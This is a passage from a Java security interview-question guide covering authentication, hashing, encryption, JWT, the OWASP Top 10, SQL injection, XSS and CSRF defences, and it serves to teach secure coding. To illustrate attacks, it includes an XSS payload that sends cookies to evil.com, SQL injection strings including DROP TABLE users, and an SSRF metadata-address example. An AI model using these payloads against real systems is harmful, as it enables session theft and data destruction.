# Java Security

> 💡 **Interviewer Tip:** Security questions reveal whether a candidate thinks adversarially. The best answers don't just describe mechanisms — they explain *what attack* each mechanism prevents and *what happens* when it's misconfigured.

---

## Table of Contents
1. [Authentication vs Authorization](#authentication-vs-authorization)
2. [Password Hashing](#password-hashing)
3. [Cryptography Basics](#cryptography-basics)
4. [JWT](#jwt)
5. [OWASP Top 10](#owasp-top-10)
6. [SQL Injection Prevention](#sql-injection-prevention)
7. [XSS & CSRF](#xss--csrf)
8. [Secure Coding Practices](#secure-coding-practices)

---

## Authentication vs Authorization

### 🟢 Q1. What is the difference between Authentication and Authorization?

<details><summary>Click to reveal answer</summary>

- **Authentication** — Verifies *who you are* (identity). "Are you really Alice?"
- **Authorization** — Verifies *what you can do* (permissions). "Can Alice access /admin?"

```
Request → [Authentication] → [Authorization] → Resource
            "Who are you?"      "What can you do?"
```

```java
// Spring Security example demonstrating both
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // AUTHENTICATION: How to verify identity
            .formLogin(login -> login
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard")
            )
            .httpBasic(Customizer.withDefaults()) // Basic auth for APIs

            // AUTHORIZATION: Who can access what
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/users").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            );

        return http.build();
    }
}

// Authentication: Check credentials
@Service
public class AuthService implements UserDetailsService {
    @Override
    public UserDetails loadUserByUsername(String username) {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException(username));
        return new org.springframework.security.core.userdetails.User(
            user.getUsername(),
            user.getHashedPassword(),
            user.getRoles().stream()
                .map(r -> new SimpleGrantedAuthority("ROLE_" + r))
                .collect(Collectors.toList())
        );
    }
}

// Authorization: Role-based access on methods
@Service
public class AdminService {

    @PreAuthorize("hasRole('ADMIN')")
    public List<User> getAllUsers() { ... }

    @PostAuthorize("returnObject.username == authentication.name or hasRole('ADMIN')")
    public User getUserProfile(Long id) { ... }

    @PreAuthorize("#userId == authentication.principal.id or hasRole('ADMIN')")
    public void updateUser(Long userId, UserDto dto) { ... }
}
```

</details>

---

### 🟡 Q2. What are common authentication mechanisms in Java web applications?

<details><summary>Click to reveal answer</summary>

| Mechanism | How it works | Use case |
|---|---|---|
| Session-based | Server stores session, client sends session cookie | Traditional web apps |
| JWT (Bearer token) | Stateless token, client sends in header | REST APIs, microservices |
| OAuth 2.0 | Delegated authorization via access tokens | Third-party login |
| SAML | XML-based SSO | Enterprise SSO |
| API Keys | Static keys in header | Service-to-service |
| mTLS | Mutual TLS certificate auth | High-security services |

```java
// Session-based authentication
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request,
                                HttpSession session) {
    User user = authService.authenticate(request.getUsername(), request.getPassword());
    session.setAttribute("userId", user.getId());
    session.setMaxInactiveInterval(1800); // 30 min
    return ResponseEntity.ok(Map.of("message", "Logged in"));
}

// JWT authentication
@PostMapping("/api/auth/token")
public ResponseEntity<TokenResponse> getToken(@RequestBody LoginRequest request) {
    User user = authService.authenticate(request.getUsername(), request.getPassword());
    String token = jwtService.generateToken(user);
    return ResponseEntity.ok(new TokenResponse(token));
}

// API Key authentication (filter)
@Component
public class ApiKeyFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        String apiKey = request.getHeader("X-API-Key");
        if (apiKeyService.isValid(apiKey)) {
            String clientId = apiKeyService.getClientId(apiKey);
            SecurityContextHolder.getContext().setAuthentication(
                new ApiKeyAuthenticationToken(clientId));
        }
        chain.doFilter(request, response);
    }
}
```

</details>

---

## Password Hashing

### 🟢 Q3. Why should you never store passwords in plaintext?

<details><summary>Click to reveal answer</summary>

Plaintext passwords are catastrophically dangerous:
1. **Database breach** — Attacker gets all passwords immediately
2. **Credential stuffing** — Users reuse passwords, so one breach compromises accounts on other sites
3. **Insider threat** — Employees can see customer passwords
4. **Regulatory violation** — GDPR, PCI-DSS require adequate protection

**Evolution of password storage:**

```java
// ❌ NEVER: Plaintext
password = "securePass123"

// ❌ NEVER: Encryption (can be reversed with the key)
password = AES.encrypt("securePass123", secretKey)

// ❌ AVOID: Unsalted MD5 or SHA-1 (rainbow table attacks)
password = MD5.hash("securePass123") // = "5e175b5a22a9f25dd2927..."
// Attacker: look up hash in rainbow table → instant crack!

// ❌ AVOID: Salted SHA-256 (fast — brute-forceable on GPU)
String salt = UUID.randomUUID().toString();
String hash = SHA256.hash(password + salt);
// GPU: 10 billion SHA-256 hashes per second!

// ✅ CORRECT: BCrypt, Argon2, or scrypt (slow, work-factor adjustable)
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12); // cost factor
String hash = encoder.encode("securePass123");
// $2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
```

</details>

---

### 🟢 Q4. How does BCrypt work and how do you use it in Java?

<details><summary>Click to reveal answer</summary>

BCrypt is a password hashing function designed to be slow and adaptive:
- Built-in **salt** (random, stored in the hash output)
- Configurable **cost factor** (work factor) — controls how slow it is
- Output format: `$2a$<cost>$<22-char-salt><31-char-hash>`

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

// Configuration
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12); // Cost factor 12 (~250ms per hash)
}

@Service
public class UserService {

    @Autowired private PasswordEncoder passwordEncoder;
    @Autowired private UserRepository userRepository;

    public User register(String username, String rawPassword) {
        // Hash password before storing
        String hashedPassword = passwordEncoder.encode(rawPassword);
        // Different hash each time due to random salt!
        // "password123" → "$2a$12$xTBsb4..."
        // "password123" → "$2a$12$dKpqT4..." (different!)

        User user = new User(username, hashedPassword);
        return userRepository.save(user);
    }

    public boolean authenticate(String username, String rawPassword) {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException(username));

        // matches() extracts salt from stored hash, re-hashes, compares
        return passwordEncoder.matches(rawPassword, user.getHashedPassword());
    }
}

// Manual BCrypt (without Spring)
import org.mindrot.jbcrypt.BCrypt;

String hashed = BCrypt.hashpw("myPassword", BCrypt.gensalt(12));
boolean matches = BCrypt.checkpw("myPassword", hashed); // true

// Rehashing with increased cost (password rotation without re-login)
public void upgradePasswordIfNeeded(User user, String rawPassword) {
    if (passwordEncoder.upgradeEncoding(user.getHashedPassword())) {
        String newHash = passwordEncoder.encode(rawPassword);
        user.setHashedPassword(newHash);
        userRepository.save(user);
    }
}
```

> 💡 **Interviewer Tip:** Cost factor 12 is a common recommendation (~250ms). You should increase it as hardware gets faster. OWASP recommends bcrypt cost ≥ 10.

</details>

---

### 🟡 Q5. Explain SHA-256 and when it's appropriate for security.

<details><summary>Click to reveal answer</summary>

SHA-256 is a cryptographic hash function producing a 256-bit (32-byte) digest. It is:
- **Fast** — NOT suitable for passwords (brute-force risk)
- **Deterministic** — Same input always → same output
- **One-way** — Cannot reverse the hash
- **Collision-resistant** — Infeasible to find two inputs with same hash

```java
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.HexFormat;

public class HashingUtils {

    // SHA-256 for non-password hashing
    public static String sha256(String input) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.getBytes(StandardCharsets.UTF_8));
            return HexFormat.of().formatHex(hashBytes);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("SHA-256 not available", e);
        }
    }

    // HMAC-SHA256 for integrity verification (uses a secret key)
    public static String hmacSha256(String data, String secretKey) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        SecretKeySpec keySpec = new SecretKeySpec(
            secretKey.getBytes(StandardCharsets.UTF_8), "HmacSHA256");
        mac.init(keySpec);
        byte[] hash = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
        return HexFormat.of().formatHex(hash);
    }
}

// Appropriate SHA-256 use cases:
// ✅ File integrity verification
String fileChecksum = sha256(Files.readString(Path.of("document.pdf")));

// ✅ Data fingerprinting / deduplication
String documentHash = sha256(documentContent);
if (existingHashes.contains(documentHash)) { /* duplicate */ }

// ✅ API request signing (with HMAC)
String signature = hmacSha256(requestBody, apiSecret);
request.addHeader("X-Signature", signature);

// ✅ JWT signature (HS256 = HMAC-SHA256)
// Token header.payload — signed with HMAC-SHA256

// ❌ NEVER for passwords — too fast, vulnerable to GPU brute force
```

</details>

---

## Cryptography Basics

### 🟡 Q6. Explain AES encryption and implement it in Java.

<details><summary>Click to reveal answer</summary>

**AES (Advanced Encryption Standard)** is a symmetric cipher — same key for encryption and decryption.
- Block size: 128 bits
- Key sizes: 128, 192, or 256 bits
- Modes: ECB (insecure), CBC, GCM (recommended)

```java
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.*;
import java.util.Base64;

public class AesEncryption {

    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/GCM/NoPadding";
    private static final int GCM_IV_LENGTH = 12;  // 96 bits
    private static final int GCM_TAG_LENGTH = 128; // bits

    // Generate a random AES key
    public static SecretKey generateKey(int bits) throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(bits, new SecureRandom()); // 128, 192, or 256
        return keyGen.generateKey();
    }

    // Encrypt with AES-GCM (authenticated encryption)
    public static String encrypt(String plaintext, SecretKey key) throws Exception {
        // Generate random IV (Initialization Vector) — NEVER reuse!
        byte[] iv = new byte[GCM_IV_LENGTH];
        new SecureRandom().nextBytes(iv);
        GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);

        byte[] ciphertext = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));

        // Prepend IV to ciphertext (IV is not secret — needed for decryption)
        byte[] encrypted = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, encrypted, 0, iv.length);
        System.arraycopy(ciphertext, 0, encrypted, iv.length, ciphertext.length);

        return Base64.getEncoder().encodeToString(encrypted);
    }

    // Decrypt with AES-GCM
    public static String decrypt(String encryptedBase64, SecretKey key) throws Exception {
        byte[] encrypted = Base64.getDecoder().decode(encryptedBase64);

        // Extract IV from the beginning
        byte[] iv = Arrays.copyOfRange(encrypted, 0, GCM_IV_LENGTH);
        byte[] ciphertext = Arrays.copyOfRange(encrypted, GCM_IV_LENGTH, encrypted.length);

        GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.DECRYPT_MODE, key, parameterSpec);

        byte[] plaintext = cipher.doFinal(ciphertext); // Throws if tampered!
        return new String(plaintext, StandardCharsets.UTF_8);
    }

    // Deriving key from password (for storing in config or user-provided key)
    public static SecretKey deriveKeyFromPassword(String password, byte[] salt)
            throws Exception {
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 310_000, 256);
        SecretKey tmp = factory.generateSecret(spec);
        return new SecretKeySpec(tmp.getEncoded(), "AES");
    }
}

// Usage
SecretKey key = AesEncryption.generateKey(256);
String encrypted = AesEncryption.encrypt("Sensitive PII data", key);
String decrypted = AesEncryption.decrypt(encrypted, key);
```

✅ **Best Practice:** Always use GCM mode — it provides both confidentiality AND authentication (detects tampering). ECB mode is insecure and should never be used.

</details>

---

### 🟡 Q7. What is RSA and when do you use it instead of AES?

<details><summary>Click to reveal answer</summary>

**RSA** is an asymmetric cipher — public key encrypts, private key decrypts (or vice versa for signing).

| Feature | AES (Symmetric) | RSA (Asymmetric) |
|---|---|---|
| Keys | Single shared key | Public + Private key pair |
| Speed | Fast | Slow (~1000x slower) |
| Key exchange | Problem: how to share key? | Solves key exchange |
| Use case | Bulk data encryption | Key exchange, signatures |
| Max data size | Unlimited | ~245 bytes (2048-bit key) |

```java
import java.security.*;
import javax.crypto.*;

public class RsaExample {

    // Generate RSA key pair
    public static KeyPair generateKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048, new SecureRandom()); // 2048+ bits recommended
        return generator.generateKeyPair();
    }

    // Encrypt with public key
    public static byte[] encrypt(byte[] data, PublicKey publicKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(data);
    }

    // Decrypt with private key
    public static byte[] decrypt(byte[] encrypted, PrivateKey privateKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
        return cipher.doFinal(encrypted);
    }

    // Digital signature: sign with PRIVATE key, verify with PUBLIC key
    public static byte[] sign(byte[] data, PrivateKey privateKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initSign(privateKey);
        signature.update(data);
        return signature.sign();
    }

    public static boolean verify(byte[] data, byte[] sig, PublicKey publicKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initVerify(publicKey);
        signature.update(data);
        return signature.verify(sig);
    }
}

// Hybrid encryption (best of both worlds — how TLS works)
// 1. Generate random AES key
// 2. Encrypt the AES key with RSA public key
// 3. Encrypt the actual data with AES
// 4. Send: [RSA-encrypted AES key] + [AES-encrypted data]
// Recipient: decrypt AES key with RSA private key → decrypt data with AES key
```

</details>

---

## JWT

### 🟡 Q8. Explain JWT structure and how to implement JWT in Java.

<details><summary>Click to reveal answer</summary>

**JWT (JSON Web Token)** is a compact, URL-safe token format: `header.payload.signature`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header (Base64URL)
.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZXMiOlsiVVNFUiJdLCJpYXQiOjE2MDAwMDAwMDAsImV4cCI6MTYwMDAwMzYwMH0=  ← Payload (Base64URL)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature (HMAC-SHA256)
```

**Header:** `{"alg": "HS256", "typ": "JWT"}`
**Payload:** `{"sub": "user123", "roles": ["USER"], "iat": 1600000000, "exp": 1600003600}`
**Signature:** HMAC-SHA256(base64(header) + "." + base64(payload), secret)

```java
// Using jjwt library (io.jsonwebtoken)
@Service
public class JwtService {

    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.expiration-ms}")
    private long expirationMs;

    private SecretKey getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }

    // Generate JWT
    public String generateToken(UserDetails userDetails) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("roles", userDetails.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .collect(Collectors.toList()));

        return Jwts.builder()
            .claims(claims)
            .subject(userDetails.getUsername())
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis() + expirationMs))
            .signWith(getSigningKey(), Jwts.SIG.HS256)
            .compact();
    }

    // Validate and parse JWT
    public Claims validateToken(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .build()
            .parseSignedClaims(token)
            .getPayload(); // Throws if invalid/expired
    }

    public String extractUsername(String token) {
        return validateToken(token).getSubject();
    }

    public boolean isTokenExpired(String token) {
        return validateToken(token).getExpiration().before(new Date());
    }
}

// JWT Filter
@Component
public class JwtAuthFilter extends OncePerRequestFilter {

    @Autowired private JwtService jwtService;
    @Autowired private UserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse resp,
                                    FilterChain chain) throws ServletException, IOException {
        String authHeader = req.getHeader("Authorization");
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            chain.doFilter(req, resp);
            return;
        }

        String jwt = authHeader.substring(7);
        try {
            String username = jwtService.extractUsername(jwt);
            if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                Claims claims = jwtService.validateToken(jwt);
                UsernamePasswordAuthenticationToken authToken =
                    new UsernamePasswordAuthenticationToken(
                        userDetails, null, userDetails.getAuthorities());
                authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(req));
                SecurityContextHolder.getContext().setAuthentication(authToken);
            }
        } catch (JwtException e) {
            resp.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Invalid JWT");
            return;
        }
        chain.doFilter(req, resp);
    }
}
```

🚨 **Common Mistake:** Storing JWTs in `localStorage` — vulnerable to XSS. Store in `httpOnly` cookies.

</details>

---

### 🟡 Q9. What are JWT security risks and best practices?

<details><summary>Click to reveal answer</summary>

```java
// ❌ Risk 1: Algorithm confusion attack
// Attacker changes "alg": "HS256" to "alg": "none" (unsigned JWT)
// Prevention: Explicitly specify expected algorithm
Jwts.parser()
    .verifyWith(signingKey)
    // Don't accept "none" algorithm — jjwt handles this by default

// ❌ Risk 2: Weak secret key
String weakSecret = "secret"; // Too short and guessable!

// ✅ Use a cryptographically strong key (at least 256 bits for HS256)
SecretKey strongKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);
// Or from config: at least 32 random bytes, Base64-encoded

// ❌ Risk 3: JWT in localStorage (XSS vulnerable)
// JavaScript can read it: document.getElementById('token').value

// ✅ Store in httpOnly cookie (not accessible by JavaScript)
Cookie jwtCookie = new Cookie("jwt", token);
jwtCookie.setHttpOnly(true);  // ← Cannot be read by JS
jwtCookie.setSecure(true);    // ← HTTPS only
jwtCookie.setSameSite("Strict"); // ← CSRF protection
jwtCookie.setPath("/");
jwtCookie.setMaxAge(3600);
response.addCookie(jwtCookie);

// ❌ Risk 4: No expiration
Jwts.builder().subject("user").compact(); // Never expires!

// ✅ Always set expiration
Jwts.builder()
    .expiration(new Date(System.currentTimeMillis() + 15 * 60 * 1000)) // 15 min

// Risk 5: No token revocation (JWT is stateless)
// ✅ Maintain a token blacklist (Redis) for logout
@Service
public class TokenBlacklist {
    @Autowired private RedisTemplate<String, String> redis;

    public void invalidate(String token, Duration ttl) {
        redis.opsForValue().set("blacklist:" + token, "revoked", ttl);
    }

    public boolean isBlacklisted(String token) {
        return redis.hasKey("blacklist:" + token);
    }
}
```

</details>

---

## OWASP Top 10

### 🟡 Q10. What are the OWASP Top 10 vulnerabilities?

<details><summary>Click to reveal answer</summary>

OWASP (Open Web Application Security Project) Top 10 is a standard awareness document for web application security:

| # | Vulnerability | Java/Spring Example |
|---|---|---|
| A01 | Broken Access Control | Missing `@PreAuthorize`, IDOR |
| A02 | Cryptographic Failures | Plaintext passwords, weak cipher |
| A03 | Injection | SQL injection, LDAP injection |
| A04 | Insecure Design | No rate limiting, no input validation |
| A05 | Security Misconfiguration | Default credentials, exposed stack traces |
| A06 | Vulnerable Components | Outdated Spring/Log4j versions |
| A07 | Auth & Session Failures | Weak passwords, no MFA |
| A08 | Software & Data Integrity | No code signing, unsafe deserialization |
| A09 | Security Logging Failures | No audit logs, logging passwords |
| A10 | SSRF | User-controlled URLs fetched by server |

```java
// A01: Broken Access Control (IDOR — Insecure Direct Object Reference)
// ❌ VULNERABLE: User can access any user's data by changing the ID
@GetMapping("/users/{id}/profile")
public UserProfile getProfile(@PathVariable Long id) {
    return userService.findById(id); // No check if current user owns this profile!
}

// ✅ FIXED:
@GetMapping("/users/{id}/profile")
public UserProfile getProfile(@PathVariable Long id,
                               @AuthenticationPrincipal UserDetails currentUser) {
    if (!currentUser.getId().equals(id) && !currentUser.hasRole("ADMIN")) {
        throw new AccessDeniedException("Cannot access other user's profile");
    }
    return userService.findById(id);
}

// A05: Security Misconfiguration
// ❌ Exposes stack trace to users
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handleAll(Exception e) {
    return ResponseEntity.status(500).body(e.getMessage()); // Leaks internals!
}

// ✅ Generic error response
@ExceptionHandler(Exception.class)
public ResponseEntity<ErrorResponse> handleAll(Exception e) {
    log.error("Unhandled exception", e); // Log internally
    return ResponseEntity.status(500)
        .body(new ErrorResponse("An error occurred", requestId));
}

// A10: SSRF (Server-Side Request Forgery)
// ❌ VULNERABLE: User controls the URL fetched by server
@GetMapping("/fetch")
public String fetch(@RequestParam String url) {
    return httpClient.get(url).body(); // Can hit internal services: http://169.254.169.254/
}

// ✅ FIXED: Allowlist of permitted domains
@GetMapping("/fetch")
public String fetch(@RequestParam String url) {
    URI uri = URI.create(url);
    if (!ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new IllegalArgumentException("Domain not allowed");
    }
    return httpClient.get(url).body();
}
```

</details>

---

## SQL Injection Prevention

### 🟢 Q11. What is SQL injection and how do you prevent it?

<details><summary>Click to reveal answer</summary>

**SQL Injection** occurs when user input is concatenated into SQL queries, allowing attackers to manipulate the query.

```java
// ❌ VULNERABLE: String concatenation
String username = request.getParameter("username");
// Attacker sends: ' OR '1'='1
String query = "SELECT * FROM users WHERE username = '" + username + "'";
// Becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
// Returns ALL users!

// Another attack: ' OR 1=1; DROP TABLE users; --
// ❌ NEVER do this:
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Prevention 1: Parameterized Queries (Prepared Statements)**
```java
// ✅ SAFE: Parameterized query — input treated as data, not SQL
String query = "SELECT * FROM users WHERE username = ? AND password_hash = ?";
PreparedStatement ps = connection.prepareStatement(query);
ps.setString(1, username);
ps.setString(2, hashedPassword);
ResultSet rs = ps.executeQuery();
// Even if username = "' OR '1'='1", it's safely escaped
```

**Prevention 2: JPA / Spring Data (uses prepared statements internally)**
```java
// ✅ SAFE: Spring Data JPA
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsernameAndActive(String username, boolean active);

    // Safe JPQL
    @Query("SELECT u FROM User u WHERE u.email = :email")
    Optional<User> findByEmail(@Param("email") String email);
}

// ✅ SAFE: Criteria API
public List<User> searchUsers(String name) {
    CriteriaBuilder cb = em.getCriteriaBuilder();
    CriteriaQuery<User> query = cb.createQuery(User.class);
    Root<User> root = query.from(User.class);
    query.where(cb.like(root.get("name"), "%" + name + "%"));
    return em.createQuery(query).getResultList();
}

// ❌ VULNERABLE JPQL (native query concatenation still dangerous)
@Query(value = "SELECT * FROM users WHERE name = '" + name + "'", nativeQuery = true)
// ✅ Use @Param instead
@Query(value = "SELECT * FROM users WHERE name = :name", nativeQuery = true)
List<User> findByName(@Param("name") String name);
```

**Prevention 3: Input validation (defense in depth)**
```java
public void searchUser(String username) {
    // Validate format (not a replacement for parameterized queries!)
    if (!username.matches("[a-zA-Z0-9_-]{3,50}")) {
        throw new IllegalArgumentException("Invalid username format");
    }
    // Use parameterized query regardless
}
```

</details>

---

## XSS & CSRF

### 🟡 Q12. What is Cross-Site Scripting (XSS) and how do you prevent it?

<details><summary>Click to reveal answer</summary>

**XSS** occurs when attacker-controlled scripts run in other users' browsers.

**Types:**
- **Stored XSS** — Malicious script saved to DB, served to all users
- **Reflected XSS** — Script in URL parameter, reflected in response
- **DOM-based XSS** — Client-side script processes attacker data

```java
// ❌ VULNERABLE: User input rendered as HTML
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q); // q = "<script>document.location='https://evil.com?c='+document.cookie</script>"
    return "search-results";
}
// In JSP: Welcome, ${query}!  ← Executes the script!

// ✅ Prevention 1: Output encoding (primary defense)
// Spring MVC with Thymeleaf (auto-escapes by default):
// th:text="${query}" — safely escaped
// th:utext="${query}" — UNSAFE, renders HTML — avoid!

// JSP with JSTL:
// <c:out value="${query}"/> — escaped
// ${query} — NOT escaped! Use fn:escapeXml()

// ✅ Prevention 2: Content Security Policy (CSP) header
@Component
public class SecurityHeadersFilter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) res;
        response.setHeader("Content-Security-Policy",
            "default-src 'self'; " +
            "script-src 'self' https://cdn.example.com; " +
            "style-src 'self' 'unsafe-inline'; " +
            "img-src 'self' data:; " +
            "font-src 'self'; " +
            "connect-src 'self'; " +
            "frame-ancestors 'none'");
        response.setHeader("X-XSS-Protection", "1; mode=block");
        response.setHeader("X-Content-Type-Options", "nosniff");
        chain.doFilter(req, res);
    }
}

// ✅ Prevention 3: OWASP Java Encoder
import org.owasp.encoder.Encode;

String safeHtml  = Encode.forHtml(userInput);
String safeAttr  = Encode.forHtmlAttribute(userInput);
String safeJs    = Encode.forJavaScript(userInput);
String safeCss   = Encode.forCssString(userInput);
String safeUrl   = Encode.forUriComponent(userInput);

// Spring Boot auto-configures security headers with Spring Security:
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; script-src 'self'"))
    .xssProtection(Customizer.withDefaults())
    .contentTypeOptions(Customizer.withDefaults())
);
```

</details>

---

### 🟡 Q13. What is CSRF and how do you prevent it?

<details><summary>Click to reveal answer</summary>

**CSRF (Cross-Site Request Forgery)** tricks authenticated users into making unintended requests to your site.

**Attack flow:**
1. User is logged into `bank.com` (session cookie exists)
2. User visits malicious `evil.com` which has:
   `<img src="https://bank.com/transfer?to=hacker&amount=10000"/>`
3. Browser automatically sends the session cookie with the request
4. Bank processes the transfer as if user initiated it

**Prevention:**

```java
// Method 1: CSRF Token (Synchronizer Token Pattern)
// Spring Security enables CSRF protection by default for state-changing requests

@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // CSRF enabled by default for web apps
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // Token stored in cookie, sent in header by JS
            );
        return http.build();
    }
}

// In forms (Thymeleaf auto-includes CSRF token):
// <form th:action="@{/transfer}" method="post">
//   <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}">
// </form>

// For REST APIs (AJAX), send in header:
// X-CSRF-Token: <token value from cookie>

// Method 2: SameSite Cookie attribute
Cookie sessionCookie = new Cookie("JSESSIONID", session.getId());
sessionCookie.setSameSite("Strict");  // Never sent cross-site
// OR
sessionCookie.setSameSite("Lax");    // Sent only for top-level navigation GET

// Method 3: Custom request header check (for APIs)
// Since CSRF is a cross-origin attack, and custom headers can't be sent
// cross-origin without CORS preflight, checking for a custom header helps
if (request.getHeader("X-Requested-With") == null) {
    response.sendError(403, "CSRF protection");
    return;
}

// Method 4: Disable CSRF for stateless REST APIs (JWT-based)
// If using JWT in Authorization header (not cookie), CSRF is not applicable
http.csrf(csrf -> csrf.disable()); // Safe ONLY for stateless APIs
```

🚨 **Common Mistake:** Disabling CSRF for ALL endpoints including session-based ones. Only disable for truly stateless (JWT header-based) APIs.

</details>

---

## Secure Coding Practices

### 🟢 Q14. How do you generate secure random values in Java?

<details><summary>Click to reveal answer</summary>

```java
import java.security.SecureRandom;
import java.util.Base64;

// ❌ INSECURE: java.util.Random — predictable!
Random random = new Random();
String token = String.valueOf(random.nextLong()); // Guessable!

// ✅ SECURE: java.security.SecureRandom
SecureRandom secureRandom = new SecureRandom();

// Generate random bytes
byte[] tokenBytes = new byte[32]; // 256 bits
secureRandom.nextBytes(tokenBytes);
String secureToken = Base64.getUrlEncoder().withoutPadding()
    .encodeToString(tokenBytes);
// Example: "X3pK8mNqR2vL9wH4cJ7tE5bG1xA6yM0d"

// Generate random session ID
String sessionId = UUID.randomUUID().toString(); // Uses SecureRandom internally

// Generate CSRF token
public String generateCsrfToken() {
    byte[] bytes = new byte[32];
    new SecureRandom().nextBytes(bytes);
    return HexFormat.of().formatHex(bytes);
}

// Generate one-time password (6-digit numeric)
public String generateOTP() {
    int otp = new SecureRandom().nextInt(900_000) + 100_000; // 100000-999999
    return String.valueOf(otp);
}

// Generate API key
public String generateApiKey() {
    byte[] bytes = new byte[24];
    new SecureRandom().nextBytes(bytes);
    return "ak_" + Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
}
```

</details>

---

### 🟡 Q15. What are secure coding practices for handling sensitive data?

<details><summary>Click to reveal answer</summary>

```java
// ✅ 1. Use char[] for passwords (not String — strings are immutable and stay in pool)
char[] password = passwordField.getPassword();
try {
    authenticate(password);
} finally {
    Arrays.fill(password, '\0'); // Zero out memory after use
}

// ✅ 2. Mask sensitive data in logs
// ❌ NEVER log passwords, card numbers, SSN, tokens
log.info("User {} logged in with password {}", username, password); // NEVER!

// ✅ Sanitize before logging
log.info("User {} logged in successfully", username);
log.debug("Processing card ending in {}", card.getLastFour()); // Last 4 only

// ✅ 3. Use @JsonIgnore / @JsonProperty for sensitive fields in DTOs
@JsonInclude(JsonInclude.Include.NON_NULL)
public class UserResponse {
    private String username;
    private String email;

    @JsonIgnore // Never serialized to JSON
    private String passwordHash;

    @JsonProperty(access = JsonProperty.Access.WRITE_ONLY) // Accept in requests, never in responses
    private String password;
}

// ✅ 4. Parameterize all database queries (prevent SQL injection)
// ✅ 5. Validate and sanitize all inputs
public void createUser(@Valid @RequestBody UserRequest request) {
    // @Valid triggers Bean Validation
}

// UserRequest with validation:
public class UserRequest {
    @NotBlank @Size(min = 3, max = 50)
    @Pattern(regexp = "[a-zA-Z0-9_]+")
    private String username;

    @Email @NotBlank
    private String email;

